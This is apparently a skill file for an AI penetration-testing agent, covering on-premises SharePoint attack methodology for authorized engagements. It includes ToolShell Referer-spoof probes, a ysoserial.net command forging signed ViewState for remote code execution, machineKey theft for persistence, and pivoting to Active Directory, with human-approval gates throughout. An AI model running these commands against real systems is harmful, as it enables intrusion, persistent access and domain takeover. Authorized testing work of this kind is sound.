---
name: sharepoint-onprem
description: >
  Microsoft SharePoint Server (on-premises) attack methodology for authorized
  engagements: attack-surface fingerprinting, the ToolShell auth-bypass +
  deserialization RCE chain and its preconditions, ASP.NET ViewState /
  machineKey deserialization (forged __VIEWSTATE RCE and persistence), and
  classic SharePoint deserialization CVEs. Keywords: SharePoint, on-prem,
  _layouts/15, ToolPane.aspx, ToolShell, CVE-2025-53770, CVE-2019-0604,
  ViewState, machineKey, validationKey, ysoserial.net, _vti_bin,
  deserialization, _api/web. Do NOT use for SharePoint Online / M365 (cloud,
  see entra-attack for the identity side) — this is the on-prem IIS/.NET
  server only.
metadata:
  type: platform
  phase: hunting
  tools: [curl, nuclei, ysoserial.net, sharepwn, burp, python-poc]
depends_on: [subdomain-discovery, tech-stack-fingerprint, service-enumeration]
feeds_into: [chain-analysis, chain-web-to-rce, report-writing]
chains_with: [active-directory, windows-privesc, network-infra, deserialization]
---

## Signals
- `MicrosoftSharePointTeamServices` and `X-SharePointHealthScore` response headers; `SPRequestGuid`.
- Paths: `/_layouts/15/`, `/_vti_bin/`, `/_api/web`, `/_layouts/15/start.aspx`, `/_login/default.aspx`, `/_layouts/15/SignOut.aspx`.
- ASP.NET on IIS (`__VIEWSTATE`, `__REQUESTDIGEST` hidden fields, `.aspx`), `Set-Cookie: FedAuth` / `rtFa` for on-prem claims auth.
- Distinct from SharePoint Online: on-prem is served from the org's own hostnames/IPs, not `*.sharepoint.com`.

## Prerequisites
- Written authorization naming the SharePoint host(s). SharePoint usually runs with a privileged service account and is domain-joined — RCE here is frequently a direct line to the AD domain. Exploitation is a hard HUMAN GATE per project CLAUDE.md.
- Exact product + patch level fingerprint (2016 / 2019 / Subscription Edition + cumulative update). The deserialization CVEs are tightly patch-gated.
- For blind RCE primitives, an OOB callback channel (`engine/oast.py`, `oob-interactions`) is required to confirm execution — without a correlated callback, cap at **Inferred** (project evidence rule).

## Methodology

### 1. Fingerprint surface + version
```bash
curl -sk "https://<sp>/_vti_pvt/service.cnf" -D - -o /dev/null
curl -sk "https://<sp>/_layouts/15/start.aspx" -D - | grep -i "SharePointTeamServices\|SharePointHealthScore"
# Build number in the MicrosoftSharePointTeamServices header maps to CU/patch level.
curl -sk "https://<sp>/_api/web" -H "Accept: application/json;odata=verbose" | head
```

### 2. ToolShell chain (auth bypass -> deserialization RCE) — precondition-gated
```bash
# ToolShell (CVE-2025-49706 auth bypass + CVE-2025-49704 deser, and the
# CVE-2025-53770/53771 variants) targets on-prem SharePoint. PRECONDITIONS:
#   - on-prem (never SharePoint Online), unpatched for the specific CU,
#   - /_layouts/15/ToolPane.aspx reachable,
#   - the auth check is bypassed by spoofing Referer to the SignOut page.
# SAFE reachability probe (GET, no exploitation):
curl -sk -o /dev/null -w "%{http_code}\n" "https://<sp>/_layouts/15/ToolPane.aspx?DisplayMode=Edit" \
  -H "Referer: https://<sp>/_layouts/SignOut.aspx"
# A non-redirect/200 here indicates the bypass surface is present (Inferred). The exploitation POST
# delivers a deserialization payload and, in the known chain, EXFILTRATES the machineKey to enable
# persistent ViewState RCE — that is state-changing execution: HARD HUMAN GATE. Confirm execution via
# an OOB callback, not by assuming from the response.
```

### 3. ViewState / machineKey deserialization (the durable primitive)
```bash
# If the machineKey (validationKey + decryptionKey) is known — leaked via ToolShell, a web.config
# read, or config disclosure — you can forge a valid signed __VIEWSTATE carrying a gadget chain and
# get RCE on ANY .aspx that processes ViewState, surviving many patches until keys are rotated.
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  --generator=<__VIEWSTATEGENERATOR> \
  --validationkey=<validationKey> --validationalg=<HMACSHA256|SHA1> \
  --decryptionkey=<decryptionKey> --decryptionalg=<AES|3DES> \
  -c "nslookup <token>.<oast-domain>"    # OOB-gated command to confirm execution blind
# POST the forged __VIEWSTATE to a target .aspx; correlate the OAST callback by unique token.
```

### 4. Classic deserialization CVEs (version-dependent)
- **CVE-2019-0604** — unauth deserialization RCE via the Picker / `EntityInstanceIdEncoder` (`/_layouts/15/Picker.aspx`, ItemPickerDialog). Documented XML trigger; demonstrate with OOB callback.
- **CVE-2023-29357** (auth bypass via spoofed JWT → admin) chained with **CVE-2023-24955** (RCE), and **CVE-2024-38094** (deserialization RCE) — version-gated; label **Inferred** on version match, **Demonstrated** only with a tested trigger + callback.

### 5. Post-exploitation enumeration (authenticated or RCE)
```bash
# Service account context is usually domain-joined and often over-privileged.
whoami /all                    # via RCE: identify the SP service account + group memberships
# Pull web.config machineKey for persistence; enumerate content DBs / connection strings.
# Pivot to AD with the service account token -> active-directory.
```

## Payloads & Detection Patterns
- **machineKey is the crown jewel:** once `validationKey`/`decryptionKey` are known, forged ViewState gives repeatable RCE and persistence independent of the original bug. Flag key extraction as the high-impact event; recommend key rotation in remediation.
- **Safe reachability probes:** the ToolPane `Referer`-spoof GET and the Picker endpoint presence let you reach **Inferred** without firing a payload.
- **Blind execution:** every forged-ViewState / deserialization payload that doesn't echo output must carry a unique OAST token; a correlated DNS/HTTP callback is what promotes the finding to **Demonstrated**.

## Bypass Techniques
- **Referer-spoof auth bypass (ToolShell):** the admin ToolPane page trusts a `Referer` of the SignOut page to skip auth — the bypass is a header, not a credential.
- **JWT/claims spoofing (CVE-2023-29357):** forged OAuth/JWT tokens elevate to admin on vulnerable builds, bypassing normal auth before the RCE step.
- **Signed-ViewState bypass via leaked keys:** patches that fix a specific endpoint don't help once the machineKey is known — forged ViewState works on other `.aspx` pages until keys rotate.

## Chain Anchors
- Deserialization RCE → SharePoint service account (often domain, often over-privileged) → `active-directory` / `windows-privesc`.
- machineKey leak → persistent ViewState RCE independent of patching.
- SharePoint content access → sensitive documents / stored credentials → further internal pivots.

## Tooling
`curl`/Nuclei for fingerprint + safe probes, `ysoserial.net` for ViewState gadget generation, `sharepwn`/published ToolShell PoCs (lab-validated) for the chain, Burp for request shaping, `engine/oast.py` for the mandatory blind-execution callback. Prefer detection + OOB confirmation over blind payload spraying.

## Validation Gate
- Version/endpoint presence = **Inferred**. RCE is **Demonstrated** only with command output echoed back OR a correlated OAST callback keyed to a unique token — never from a 200/500 response alone.
- machineKey-based findings are **Demonstrated** only when a forged ViewState actually executes (callback captured); possessing the keys is **Inferred** impact until exercised.
- Auth-bypass (ToolShell Referer, JWT spoof) is **Demonstrated** only when the bypass yields an action you couldn't perform unauthenticated — show the differential.
- Record exact build number, endpoint, request/response and the OAST token correlation for every step; custody-log any extracted keys redacted.

## Gotchas
- **On-prem only.** ToolShell and the ViewState/machineKey primitives do **not** apply to SharePoint Online (M365) — confirm the host is on-prem (org hostname/IP, not `*.sharepoint.com`) before invoking this skill; the cloud identity surface is `entra-attack`.
- SharePoint's service account is frequently **domain-privileged** — RCE here often equals a fast path to Domain Admin. Flag the AD blast radius explicitly; it's usually bigger than the SharePoint finding itself.
- Build-number → patch mapping is fiddly (CU vs security-fix dates); a build can be patched for a CVE without an obvious header change. Use safe reachability probes and OOB confirmation rather than trusting the version.
- Blind deserialization payloads can throw on the server without executing (type/gadget mismatch) — a 500 is not RCE. Only an OAST callback or echoed output confirms execution.
- Extracted machineKeys are durable secrets: remediation must include **key rotation**, not just patching — note this so the finding isn't closed by a patch alone.
- Firing untested public ToolShell PoCs at production can corrupt the farm or trigger the same crashes seen in the in-the-wild campaigns — lab-replicate the build first and keep it human-gated.
